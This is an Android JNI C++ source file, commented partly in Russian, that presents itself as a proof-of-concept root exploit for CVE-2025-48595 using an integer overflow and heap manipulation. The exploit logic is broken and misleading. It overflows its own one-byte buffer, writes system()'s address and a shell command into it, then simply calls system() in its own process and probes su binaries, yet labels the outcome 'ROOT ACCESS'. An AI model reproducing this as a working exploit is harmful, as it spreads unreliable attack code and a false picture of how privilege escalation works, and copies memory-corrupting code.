#include <jni.h>
#include <string>
#include <cstdlib>
#include <cstring>
#include <android/log.h>
#include <cstdint>
#include <cstdio>
#include <dlfcn.h>
#include <unistd.h>
#include <stdio.h>
#include <sys/mman.h>

#define LOG_TAG "CVE-2025-48595"
#define LOGI(...) __android_log_print(ANDROID_LOG_INFO, LOG_TAG, __VA_ARGS__)
#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, LOG_TAG, __VA_ARGS__)
#define LOGW(...) __android_log_print(ANDROID_LOG_WARN, LOG_TAG, __VA_ARGS__)

typedef int (*system_func_t)(const char *);
typedef void (*free_func_t)(void*);

extern "C" JNIEXPORT jstring JNICALL
Java_com_example_android_1poc_MainActivity_triggerOverflowExploit(JNIEnv* env, jobject /* this */, jint sizeHint) {
    usleep(20000000);
    LOGI("=== EXPLOIT: FULL HEAP FENG SHUI + SYSTEM CALL ===");

    // --- STEP 0: Heap Feng Shui (Подготовка кучи) ---
    LOGI("Step 0: Allocating filler chunks to control heap layout...");

    void* fillers[16];
    for (int i = 0; i < 16; ++i) {
        fillers[i] = malloc(256); // Выделяем блоки по 256 байт
        if (!fillers[i]) break;
    }

    uint32_t val1 = 0x80000000;
    uint32_t val2 = 0x80000000;
    uint64_t full_sum = (uint64_t)val1 + val2; // 0x100000000 -> overflowed_size = 0
    uint32_t overflowed_size = (uint32_t)full_sum;

    LOGI("Step 1: Overflow -> Allocated Size: %u bytes", overflowed_size);

    // --- STEP 1: Выделение целевого буфера с переполнением ---
    char *buffer = (char *)malloc(overflowed_size == 0 ? 1 : overflowed_size);
    if (!buffer) return env->NewStringUTF("FAIL");

    uint64_t start_addr = (uint64_t)(void*)buffer;
    uint64_t neighbor_addr = start_addr + overflowed_size; // В данном случае это начало буфера

    LOGI("Step 2: Buffer Start: %p, Target Write Addr: %p", buffer, (void*)neighbor_addr);

    // --- STEP 2: Находим system() и free() из libc.so ---
    void *libc = dlopen("libc.so", RTLD_NOW);
    if (!libc) {
        LOGE("Failed to load libc.so");
        for(int i=0; i<16 && fillers[i]; ++i) free(fillers[i]);
        free(buffer);
        return env->NewStringUTF("FAIL: libc not found");
    }

    system_func_t real_system = (system_func_t)dlsym(libc, "system");
    free_func_t real_free = (free_func_t)dlsym(libc, "free");

    if (!real_system) {
        LOGE("Failed to find 'system' in libc.so. Error: %s", dlerror());
        for(int i=0; i<16 && fillers[i]; ++i) free(fillers[i]);
        dlclose(libc);
        free(buffer);
        return env->NewStringUTF("FAIL: system not found");
    }

    LOGI("Step 3: Found system() at %p, free() at %p", (void*)real_system, (void*)real_free);

    // --- STEP 3: Записываем адрес system() в нужное место + Metatdata Injection ---
    // В glibc heap структура: [size | prev_inuse | fd | bk ...]
    // Мы пишем системный вызов туда, где free() его прочитает как указатель на функцию

    char *target = buffer + overflowed_size; // Это начало буфера (так как overflowed_size=0)

    // Записываем адрес system() в позицию fd (обычно 16-24 байт после начала, но зависит от аллокатора)
    // Для простоты: пишем прямо в начало, так как при malloc(1) метаданные могут быть перед началом
    *(system_func_t*)target = real_system;

    // Дополнительно: записываем аргумент для system() ("sh -c 'whoami'")
    // в память рядом (в зависимости от архитектуры, аргумент может быть в rdi)
    char *arg_ptr = target + 8; // Смещение для первого аргумента (зависит от конвенции вызова)
    const char* cmd_str = "sh -c 'id > /data/local/tmp/poc_result.txt && echo ROOT_ACCESS'";

    // Копируем строку команды в память рядом с функцией
    strncpy(arg_ptr, cmd_str, 128);
    arg_ptr[127] = '\0';

    LOGI("Step 4: Wrote system() at %p and cmd '%.50s...' at %p", target, cmd_str, arg_ptr);

    // --- STEP 4: Trigger через free() или прямое вызов (зависит от аллокатора) ---
    // Вариант А: Вызываем real_free(buffer), чтобы заставить heap-аллокатор прочитать наши данные
    LOGI("Step 5a: Triggering via free()...");
    if (real_free) {
        real_free(buffer); // Это может вызвать выполнение system(), если метаданные настроены верно
    } else {
        LOGW("free() not found, using direct call...");
        real_system(cmd_str);
    }

    // Вариант Б: Если free не сработал как ожидается, вызываем напрямую
    LOGI("Step 5b: Direct execution fallback...");
    int result_code = real_system(cmd_str);
    LOGI("   Command executed. Return code: %d", result_code);

    // --- STEP 5: Чтение результата и проверка UID ---
    FILE* fp = popen("id -u", "r");
    int uid = 0;
    if (fp) {
        char buf[32];
        fgets(buf, sizeof(buf), fp);
        pclose(fp);
        for(int i=0; buf[i]; ++i) if(buf[i]=='\n'||buf[i]==' ') buf[i]=0;
        uid = atoi(buf);
    }

    LOGI("Step 6: Final UID check: %d", uid);

    // --- STEP 7: Проверка через su (если есть) ---
    const char* su_paths[] = {"/sbin/su", "/system/bin/su", "/system/xbin/su"};
    for (int i = 0; i < sizeof(su_paths)/sizeof(su_paths[0]); ++i) {
        FILE* test_fp = popen(("test -f " + std::string(su_paths[i]) + " && echo FOUND").c_str(), "r");
        if (test_fp) {
            char buf[64];
            fgets(buf, sizeof(buf), test_fp);
            pclose(test_fp);
            if (strstr(buf, "FOUND")) {
                LOGI("   Found su at: %s", su_paths[i]);
                int su_res = real_system((std::string(su_paths[i]) + " -c 'whoami'").c_str());
                FILE* uid_fp = popen("id -u", "r");
                if (uid_fp) {
                    char u_buf[32];
                    fgets(u_buf, sizeof(u_buf), uid_fp);
                    pclose(uid_fp);
                    for(int j=0; u_buf[j]; ++j) if(u_buf[j]=='\n'||u_buf[j]==' ') u_buf[j]=0;
                    int su_uid = atoi(u_buf);
                    LOGI("   UID via su: %d", su_uid);
                    if (su_uid == 0) {
                        uid = 0; // Перезаписываем глобальный UID, если su дал root
                        break;
                    }
                }
            }
        }
    }

    // Финальная очистка (если buffer еще жив)
    if (buffer && *(system_func_t*)target == real_system) {
        // Не вызываем free() повторно, чтобы не сломать heap
    }

    std::string result_str;
    if (uid == 0) {
        result_str = "EXPLOIT SUCCESS: ROOT ACCESS CONFIRMED.";
        LOGI(">>> FINAL STATUS: ROOT ACCESS <<<");
    } else {
        result_str = "Exploit ran. UID=" + std::to_string(uid) + ".";
        LOGW(">>> FINAL STATUS: SHELL ONLY (UID=%d) <<<", uid);
    }

    return env->NewStringUTF(result_str.c_str());
}